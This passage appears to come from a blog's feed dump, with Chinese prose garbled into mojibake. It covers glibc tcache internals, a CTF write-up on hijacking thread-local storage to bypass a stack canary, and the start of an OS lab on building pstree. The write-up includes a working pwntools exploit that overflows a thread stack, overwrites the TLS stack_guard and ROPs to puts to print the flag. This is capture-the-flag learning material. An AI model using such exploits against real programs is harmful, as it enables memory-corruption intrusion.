&amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// mp_.tcache_count=7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);  <span class="comment">//pè¦é‡Šæ”¾çš„chunkï¼Œtc_idxå¯¹åº”sizeçš„entriesä¸‹æ ‡</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ <code>tc_idx</code> åˆæ³•ï¼Œ<code>tcache-&gt;counts[tc_idx]</code> åœ¨ 7 ä¸ªä»¥å†…æ—¶ï¼Œå°±è¿›å…¥ <code>tcache_put()</code></p><p>tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> <span class="comment">//chunkè¦é‡Šæ”¾çš„chunkï¼Œtc_idxå¯¹åº”sizeçš„entriesä¸‹æ ‡</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//å¾—åˆ°chunkçš„tcache_entryç»“æ„ä½“ </span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//64</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//chunkçš„nextæŒ‡å‘å¯¹åº”sizeé“¾çš„æœ€æ–°ä¸€ä¸ªchunk</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;<span class="comment">//æŠŠå½“å‰chunkæ”¾å…¥ tcache_perthread_structç®¡ç†ç»“æ„</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//++å½“å‰sizeæ•°é‡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾æ—§å‡ ä¹æ²¡æœ‰ä¿æŠ¤</p><p><strong>glibc2.29</strong>æœ‰äº†key</p><p>_int_freeå‡½æ•°é‡Œä¼šå¤šä¼šæ£€æµ‹ key å­—æ®µæ˜¯å¦ä¸º tcacheï¼Œå¦‚æœç›¸ç­‰åˆ™æ£€æµ‹ free çš„æŒ‡é’ˆå€¼æ˜¯å¦åœ¨å¯¹åº”çš„tcache_entry é“¾ä¸Šï¼Œå‡ºç°åˆ™è§†ä¸ºç¨‹åºåœ¨double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">  detect a double free.  */</span></span><br><span class="line">e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure><p>å¤šäº†PROTECT_PTR å¯¹å½“å‰é‡Šæ”¾chunkçš„tcache_entryçš„nextæŒ‡é’ˆå˜ä¸ºå­˜å‚¨å½“å‰nextåœ°å€å’Œnextè¦æŒ‡å‘chunkdataåœ°å€å¼‚æˆ–çš„å€¼</p><p>çœ‹ä¸ªä¾‹å­</p><p><img src="/2023/03/26/Tcache/image-20230326234600469.png" alt="image-20230326234600469"></p><p>pwndbgå¸®æˆ‘ä»¬è‡ªåŠ¨è§£æäº†</p><p><img src="/2023/03/26/Tcache/image-20230326234343508.png" alt="image-20230326234343508"></p><p>0x55500000c6d9æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ çº¢è‰²éƒ¨åˆ†å¼‚æˆ–æ¥çš„ï¼š0x555555559380 xor 0x555555559&#x3D;0x55500000C6D9</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLSåŠ«æŒè¿‡canary(TLS Hijack Bypass Canary)</title>
      <link href="/2023/03/26/TLS-Hijack/"/>
      <url>/2023/03/26/TLS-Hijack/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw">https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw</a><br>æå–ç ï¼š1pcz</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/pwn&gt; checksec checkin </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/checkin&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ‰«äº†ä¸€äº›ï¼Œå¤šçº¿ç¨‹çš„ä¸€ä¸ªç¨‹åº</p><p>ä¸»çº¿ç¨‹æŠŠflagè¯»å–åˆ°bssæ®µ</p><p>pthread_createåˆ›å»ºçš„ä¸€ä¸ªå­çº¿ç¨‹çš„start_routineå‡½æ•°æœ‰æ ˆæº¢å‡ºé—®é¢˜ï¼Œæº¢å‡ºå¾ˆå¤§</p><p>pthread_join()ç­‰å¾…é˜»å¡</p><p>æ³„éœ²canaryåŸºæœ¬ä¸å¯èƒ½äº†ï¼Œæœ¬æ¥æƒ³ç€SSP(Stack Smashing Protect)Leakèƒ½ä¸èƒ½æŠŠä»–çš„argv[0](__libc_argv)è¦†ç›–ä¸ºflagåœ°å€ï¼Œå†ç ´åcanaryè¾“å‡ºflagï¼Œä½†æ˜¯ä¸åœ¨ä¸€ä¸ªçº¿ç¨‹æ ˆåŒºä¸ä¸€æ ·</p><h3 id="çº¿ç¨‹å…±äº«"><a href="#çº¿ç¨‹å…±äº«" class="headerlink" title="çº¿ç¨‹å…±äº«"></a>çº¿ç¨‹å…±äº«</h3><p>åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œä¸»çº¿ç¨‹å’Œé€šè¿‡pthread_create()åˆ›å»ºå‡ºæ¥çš„å­çº¿ç¨‹å…±äº«ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li>è¿›ç¨‹çš„ä»£ç æ®µã€æ•°æ®æ®µã€å †æ®µå’Œå…±äº«åº“ç­‰è¢«æ˜ å°„åˆ°è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„æ‰€æœ‰å†…å­˜åŒºåŸŸã€‚</li><li>è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€ä¿¡å·å¤„ç†å™¨ç­‰è¿›ç¨‹çº§åˆ«çš„èµ„æºã€‚</li><li>è¿›ç¨‹ç¯å¢ƒå˜é‡ä»¥åŠå‘½ä»¤è¡Œå‚æ•°ç­‰ã€‚</li><li>å…¨å±€å˜é‡å’Œé™æ€å˜é‡ç­‰å­˜å‚¨åœ¨bssæ®µå’Œdataæ®µä¸­çš„æ•°æ®ã€‚</li><li>åŠ¨æ€åˆ†é…çš„å †å†…å­˜ï¼ˆmallocã€callocç­‰ï¼‰ã€‚</li><li>åœ¨è¿›ç¨‹ä¸­ä½¿ç”¨pthread_key_create()åˆ›å»ºçš„çº¿ç¨‹ç‰¹å®šæ•°æ®ï¼ˆThread-specific dataï¼ŒTSDï¼‰ã€‚</li></ol><p><strong>åœ¨Linuxä¸­ï¼Œè¿›ç¨‹å’Œçº¿ç¨‹éƒ½æ˜¯è½»é‡çº§çš„æ‰§è¡Œå•å…ƒï¼Œå®ƒä»¬æœ‰ä»¥ä¸‹åŒºåˆ«å’Œè”ç³»</strong></p><p>åŒºåˆ«ï¼š</p><ol><li>èµ„æºå ç”¨ï¼šè¿›ç¨‹æ˜¯ç³»ç»Ÿåˆ†é…èµ„æºçš„åŸºæœ¬å•ä½ï¼Œæ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ã€æ–‡ä»¶æè¿°ç¬¦ã€ä¿¡å·å¤„ç†å™¨ç­‰ç³»ç»Ÿèµ„æºï¼Œè€Œçº¿ç¨‹å…±äº«åŒä¸€ä¸ªè¿›ç¨‹çš„èµ„æºã€‚</li><li>è°ƒåº¦ï¼šè¿›ç¨‹ä¹‹é—´çš„åˆ‡æ¢ä»£ä»·æ¯”çº¿ç¨‹ä¹‹é—´çš„åˆ‡æ¢ä»£ä»·è¦é«˜ï¼Œå› ä¸ºè¿›ç¨‹åˆ‡æ¢æ—¶éœ€è¦ä¿å­˜å’Œæ¢å¤æ›´å¤šçš„çŠ¶æ€ä¿¡æ¯ï¼Œè€Œçº¿ç¨‹åªéœ€è¦ä¿å­˜å’Œæ¢å¤å°‘é‡çš„çŠ¶æ€ä¿¡æ¯ã€‚</li><li>å®‰å…¨ï¼šä¸åŒè¿›ç¨‹ä¹‹é—´çš„å†…å­˜ç©ºé—´æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œå› æ­¤è¿›ç¨‹ä¹‹é—´çš„è®¿é—®ä¸ä¼šç›¸äº’å¹²æ‰°ï¼Œè€Œçº¿ç¨‹ä¹‹é—´çš„è®¿é—®åˆ™éœ€è¦è¿›è¡ŒåŒæ­¥æ§åˆ¶ï¼Œä»¥é¿å…ç«æ€æ¡ä»¶ç­‰é—®é¢˜ã€‚</li></ol><p>è”ç³»ï¼š</p><ol><li>èµ„æºå…±äº«ï¼šè¿›ç¨‹å†…çš„æ‰€æœ‰çº¿ç¨‹å…±äº«åŒä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œå› æ­¤å®ƒä»¬å¯ä»¥å…±äº«å…¨å±€å˜é‡ã€é™æ€å˜é‡ã€ä»£ç æ®µå’Œæ•°æ®æ®µç­‰å†…å­˜åŒºåŸŸã€‚</li><li>å¤„ç†å™¨è°ƒåº¦ï¼šçº¿ç¨‹æ˜¯å¤„ç†å™¨è°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œä¸€ä¸ªè¿›ç¨‹ä¸­çš„å¤šä¸ªçº¿ç¨‹å¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œä»¥æé«˜å¤„ç†å™¨çš„åˆ©ç”¨ç‡ã€‚</li><li>é€šä¿¡æœºåˆ¶ï¼šè¿›ç¨‹ä¹‹é—´é€šä¿¡å¯ä»¥ä½¿ç”¨IPCæœºåˆ¶ï¼Œè€Œçº¿ç¨‹ä¹‹é—´å¯ä»¥ä½¿ç”¨çº¿ç¨‹åŒæ­¥å’Œäº’æ–¥æœºåˆ¶ç­‰æ–¹å¼è¿›è¡Œé€šä¿¡å’Œåè°ƒã€‚</li></ol><h2 id="Thread-Local-Storage"><a href="#Thread-Local-Storage" class="headerlink" title="Thread Local Storage"></a>Thread Local Storage</h2><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html">https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html</a></p><p>çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆTLSï¼‰ï¼Œæ˜¯ä¸€ç§å˜é‡çš„å­˜å‚¨æ–¹æ³•ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰ä¸€ä¸ªå‰¯æœ¬ï¼Œè¿™ä¸ªå˜é‡åœ¨å®ƒæ‰€åœ¨çš„çº¿ç¨‹å†…æ˜¯å…¨å±€å¯è®¿é—®çš„ï¼Œä½†æ˜¯ä¸èƒ½è¢«å…¶ä»–çº¿ç¨‹è®¿é—®åˆ°ï¼Œè¿™æ ·å°±ä¿æŒäº†æ•°æ®çš„çº¿ç¨‹ç‹¬ç«‹æ€§ã€‚è€Œç†ŸçŸ¥çš„å…¨å±€å˜é‡ï¼Œæ˜¯æ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®çš„ï¼Œè¿™æ ·å°±ä¸å¯é¿å…éœ€è¦é”æ¥æ§åˆ¶ï¼Œå¢åŠ äº†æ§åˆ¶æˆæœ¬å’Œä»£ç å¤æ‚åº¦ã€‚</p><p>gccé‡Œå†å®šä¹‰å‰åŠ __threadå°±å¯ä»¥å®ç°TLS</p><p>åˆ›å»ºçº¿ç¨‹çš„æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªTLSï¼ˆThread Local Storageï¼‰ï¼Œè¯¥TLSä¼šå­˜å‚¨canaryçš„å€¼ï¼Œè€ŒTLSä¼šä¿å­˜åœ¨stacké«˜åœ°å€çš„åœ°æ–¹</p><p><strong>ä¸»çº¿ç¨‹ä¸­çš„TLSé€šå¸¸ä½äºmmapæ˜ å°„å‡ºæ¥çš„åœ°å€ç©ºé—´é‡Œï¼Œè€Œä½ç½®ä¹Ÿæ¯”è¾ƒéšæœºï¼Œè¦†ç›–çš„å¯èƒ½æ€§ä¸å¤§ï¼›å­çº¿ç¨‹é€šå¸¸ä¹Ÿæ˜¯mmapå‡ºæ¥çš„ï¼Œå­çº¿ç¨‹ä¸­çš„TLSåˆ™ä½äºçº¿ç¨‹æ ˆçš„é¡¶éƒ¨</strong></p><p><strong>tcbhead_tç»“æ„ä½“</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="type">dtv_t</span> *dtv;</span><br><span class="line">        <span class="type">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="type">int</span> multiple_threads;</span><br><span class="line">        <span class="type">int</span> gscope_flag;</span><br><span class="line">        <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="type">uintptr_t</span> stack_guard;   <span class="comment">/* canaryï¼Œ0x28åç§» */</span></span><br><span class="line">        <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">        â€¦â€¦</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h3 id="gdbå¤šçº¿ç¨‹è°ƒè¯•"><a href="#gdbå¤šçº¿ç¨‹è°ƒè¯•" class="headerlink" title="gdbå¤šçº¿ç¨‹è°ƒè¯•"></a>gdbå¤šçº¿ç¨‹è°ƒè¯•</h3><p>set follow-fork-mode child</p><p>show follow-fork-mode </p><p>(1)æŸ¥çœ‹å¯åˆ‡æ¢è°ƒè¯•çš„çº¿ç¨‹ï¼šinfo threads</p><p>(2)åˆ‡æ¢è°ƒè¯•çš„çº¿ç¨‹ï¼šthread çº¿ç¨‹id</p><p>(3)åªè¿è¡Œå½“å‰çº¿ç¨‹ï¼šset scheduler-locking on</p><p>(4)è¿è¡Œå…¨éƒ¨çš„çº¿ç¨‹ï¼šset scheduler-locking off</p><p>(5)æŒ‡å®šæŸçº¿ç¨‹æ‰§è¡ŒæŸgdbå‘½ä»¤ï¼šthread apply çº¿ç¨‹id gdb_cmd</p><p>(6)å…¨éƒ¨çš„çº¿ç¨‹æ‰§è¡ŒæŸgdbå‘½ä»¤ï¼šthread apply all gdb_cmd</p><p><strong>x&#x2F;x pthread_self()æˆ–fsbase</strong>å¯ä»¥æŸ¥çœ‹çº¿ç¨‹fsåŸºä½ç½®</p><p>æ–­ç‚¹æ–­åˆ°å­çº¿ç¨‹å‡½æ•°</p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174219767.png" alt="image-20230326174219767"></p><p>distanceè®¡ç®—åç§»ï¼Œè¦†ç›–canaryå’Œstack_guardä¸ºç”¨ä¸€ä¸ªå€¼å³å¯,rop putsè¾“å‡ºflagå³å¯</p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174414780.png" alt="image-20230326174414780"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./checkin&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401338&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401340&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401341 &#x27;)</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x666666</span>)+p64(<span class="number">0x555555</span>)+p64(rop.rdi.address)+p64(<span class="number">0x4040C0</span>)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x7d8</span>-<span class="number">0x20</span>)+p64(<span class="number">0x666666</span>)</span><br><span class="line">payload=padding</span><br><span class="line">sla(<span class="string">b&#x27;eckin\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tls Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:M1 pstree</title>
      <link href="/2023/03/25/NJUOS-M1-pstree/"/>
      <url>/2023/03/25/NJUOS-M1-pstree/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/labs/M1">http://jyywiki.cn/OS/2022/labs/M1</a></p><p><strong>Keep it simple, stupid &amp;&amp; Everything is a file.</strong></p><p>å¯ä»¥ç”¨straceçœ‹ä¸€ä¸‹pstreeçš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰¾ä¸‹æ€è·¯</p><h3 id="æ‰¾åˆ°è¿›ç¨‹å…³ç³»"><a href="#æ‰¾åˆ°è¿›ç¨‹å…³ç³»" class="headerlink" title="æ‰¾åˆ°è¿›ç¨‹å…³ç³»"></a>æ‰¾åˆ°è¿›ç¨‹å…³ç³»</h3><p>proc æ–‡ä»¶ç³»ç»Ÿ (procfs) æ˜¯ç±» Unix æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ç§ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä»¥åˆ†å±‚æ–‡ä»¶ç»“æ„å‘ˆç°æœ‰å…³è¿›ç¨‹çš„ä¿¡æ¯å’Œå…¶ä»–ç³»ç»Ÿä¿¡æ¯ï¼Œä¸ºåŠ¨æ€è®¿é—®å†…æ ¸ä¸­ä¿å­˜çš„è¿›ç¨‹æ•°æ®æä¾›äº†ä¸€ç§æ›´æ–¹ä¾¿å’Œæ ‡å‡†åŒ–çš„æ–¹æ³•ã€‚ </p><p>dirent.hå¤´æ–‡ä»¶é‡Œæœ‰è¯»å–æ–‡ä»¶å¤¹çš„func <a href="https://man7.org/linux/man-pages/man0/dirent.h.0p.html">https://man7.org/linux/man-pages/man0/dirent.h.0p.html</a></p><p>ç›®å½•æ“ä½œå‡½æ•°opendirã€readdirå’Œclosedir</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line">DIR *<span class="title function_">opendir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line">æ‰“å¼€ä¸€ä¸ªä¸ç»™å®šçš„ç›®å½•ånameç›¸å¯¹åº”çš„ç›®å½•æµï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥ç›®å½•æµçš„æŒ‡é’ˆã€‚æ‰“å¼€åï¼Œè¯¥ç›®å½•æµæŒ‡å‘äº†ç›®å½•ä¸­çš„ç¬¬ä¸€ä¸ªç›®å½•é¡¹ã€‚</span><br><span class="line"><span class="keyword">struct</span> dirent *<span class="title function_">readdir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">readdirå‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘direntç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„ä½“ä»£è¡¨äº†ç”±diræŒ‡å‘çš„ç›®å½•æµä¸­çš„ä¸‹ä¸€ä¸ªç›®å½•é¡¹ï¼›å¦‚æœè¯»åˆ°end-of-fileæˆ–è€…å‡ºç°äº†é”™è¯¯ï¼Œé‚£ä¹ˆè¿”å›<span class="literal">NULL</span>ã€‚</span><br><span class="line"><span class="type">int</span> <span class="title function_">closedir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">closedirå‡½æ•°å…³é—­ä¸æŒ‡é’ˆdirç›¸è”ç³»çš„ç›®å½•æµã€‚æˆåŠŸæ—¶è¿”å›<span class="number">0</span>ï¼›å¤±è´¥æ˜¯è¿”å›<span class="number">-1</span>ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„é”™è¯¯ä»£ç errnoã€‚</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">        <span class="type">ino_t</span>          d_ino;       <span class="comment">/* inode number */</span></span><br><span class="line">        <span class="type">off_t</span>          d_off;       <span class="comment">/* offset to the next dirent */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> d_reclen;    <span class="comment">/* length of this record */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>  d_type;      <span class="comment">/* type of file */</span></span><br><span class="line">        <span class="type">char</span>           d_name[<span class="number">256</span>]; <span class="comment">/* filename */</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>&#x2F;proc&#x2F;PID&#x2F;statï¼šåœ¨ Linux æ“ä½œç³»ç»Ÿä¸­ï¼Œ&#x2F;proc&#x2F;PID&#x2F;stat æ–‡ä»¶æä¾›äº†æœ‰å…³æŒ‡å®šè¿›ç¨‹ PID çš„è¿›ç¨‹çŠ¶æ€ä¿¡æ¯ã€‚è¯¥æ–‡ä»¶çš„æ ¼å¼æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†è¿›ç¨‹çš„å¤šä¸ªçŠ¶æ€ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯é€šå¸¸ä»¥ç©ºæ ¼åˆ†éš”ã€‚</p><p>&#x2F;proc&#x2F;PID&#x2F;statusæ˜¯å¯è¯»æ€§æ›´å¥½çš„stat</p><p>&#x2F;proc&#x2F;PID&#x2F;taskï¼šè¯¥ç›®å½•åŒ…å«äº†ä¸æŒ‡å®šè¿›ç¨‹ PID å…³è”çš„æ‰€æœ‰çº¿ç¨‹çš„ä¿¡æ¯ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„å­ç›®å½•ã€‚è¿™äº›å­ç›®å½•çš„åç§°ä¸ºæ¯ä¸ªçº¿ç¨‹çš„çº¿ç¨‹ IDï¼Œå…¶ä¸‹åŒ…å«äº†ä¸è¯¥çº¿ç¨‹ç›¸å…³çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬çº¿ç¨‹çŠ¶æ€ã€çº¿ç¨‹æ‰€å±çš„è¿›ç¨‹ IDã€çº¿ç¨‹è¿è¡Œçš„ CPU æ—¶é—´ã€çº¿ç¨‹æ ˆçš„å¤§å°å’Œå†…å­˜åœ°å€ç­‰ã€‚æ­¤ç›®å½•å¯ä»¥ç”¨äºç›‘è§†å’Œç®¡ç†è¿›ç¨‹ä¸­çš„å¤šä¸ªçº¿ç¨‹ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬åªéœ€è¦éå†&#x2F;proc&#x2F;PID&#x2F;statæ‹¿åˆ°ppidå°±è¡Œ</p><p> &#x2F;proc&#x2F;PID&#x2F;stat æ–‡ä»¶çš„ä¸€èˆ¬æ ¼å¼å’Œå…¶ä¸­åŒ…å«çš„å¸¸è§è¿›ç¨‹å±æ€§</p><ul><li>pidï¼šè¿›ç¨‹ ID</li><li>commï¼šè¿›ç¨‹çš„å‘½ä»¤åç§°</li><li>stateï¼šè¿›ç¨‹çŠ¶æ€</li><li>ppidï¼šçˆ¶è¿›ç¨‹ ID</li><li>pgrpï¼šè¿›ç¨‹ç»„ ID</li><li>sessionï¼šä¼šè¯ ID</li><li>tty_nrï¼šæ‰€ä½¿ç”¨çš„ç»ˆç«¯è®¾å¤‡å·</li><li>tpgidï¼šè¿›ç¨‹ç»„ ID</li><li>flagsï¼šè¿›ç¨‹æ ‡å¿—</li><li>minfltï¼šæœªåˆ†é…é¡µé¢çš„æ•°é‡ï¼ˆå†…å­˜ä¸è¶³ï¼‰</li><li>cminfltï¼šæœªåˆ†é…æ–‡ä»¶ç¼“å­˜é¡µé¢çš„æ•°é‡</li><li>majfltï¼šåˆ†é…äº†çš„é¡µé¢çš„æ•°é‡</li><li>cmajfltï¼šåˆ†é…äº†çš„æ–‡ä»¶ç¼“å­˜é¡µé¢çš„æ•°é‡</li><li>utimeï¼šè¿›ç¨‹åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹èŠ±è´¹çš„æ—¶é—´ï¼ˆä»¥æ—¶é’Ÿæ»´ç­”ä¸ºå•ä½ï¼‰</li><li>stimeï¼šè¿›ç¨‹åœ¨å†…æ ¸æ¨¡å¼ä¸‹èŠ±è´¹çš„æ—¶é—´ï¼ˆä»¥æ—¶é’Ÿæ»´ç­”ä¸ºå•ä½ï¼‰</li><li>cutimeï¼šå­è¿›ç¨‹åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹èŠ±è´¹çš„æ—¶é—´</li></ul><h3 id="å»ºæ ‘æ‰“å°"><a href="#å»ºæ ‘æ‰“å°" class="headerlink" title="å»ºæ ‘æ‰“å°"></a>å»ºæ ‘æ‰“å°</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> 